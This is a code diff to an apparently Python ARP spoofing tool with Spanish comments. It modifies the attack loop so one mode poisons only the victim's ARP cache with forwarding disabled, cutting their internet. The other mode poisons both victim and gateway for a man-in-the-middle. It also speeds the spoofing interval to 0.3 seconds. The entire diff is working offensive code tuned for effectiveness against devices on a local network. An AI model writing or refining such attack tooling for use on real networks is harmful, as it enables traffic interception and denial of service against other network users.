@@ -96,23 +96,27 @@ def attack_loop(target_ip, target_mac, gateway_ip, gateway_mac, cut_internet):
     global stop_attack
     stop_attack = False
 
-    if not cut_internet:
-        enable_ip_forwarding()
+    if cut_internet:
+        disable_ip_forwarding()  # No reenviar tráfico
     else:
-        disable_ip_forwarding()
+        enable_ip_forwarding()   # MITM con tráfico pasando
 
     log(f"[+] Iniciando ARP spoofing contra {target_ip} ({target_mac})")
 
     while not stop_attack:
-        spoof(target_ip, gateway_ip, target_mac, gateway_mac)
-        spoof(gateway_ip, target_ip, gateway_mac, target_mac)
-        time.sleep(2)
+        if cut_internet:
+            # Solo envenena a la víctima, no al gateway
+            spoof(target_ip, gateway_ip, target_mac, gateway_mac)
+        else:
+            # MITM: envenena en ambos sentidos
+            spoof(target_ip, gateway_ip, target_mac, gateway_mac)
+            spoof(gateway_ip, target_ip, gateway_mac, target_mac)
+        time.sleep(0.3)  # Intervalo más rápido
 
     log("[*] Ataque detenido. Restaurando red...")
     restore(target_ip, gateway_ip)
     restore(gateway_ip, target_ip)
-    if not cut_internet:
-        disable_ip_forwarding()
+    disable_ip_forwarding()
     log("[+] Limpieza completada.")
 
 # ----------------- Funciones GUI -----------------
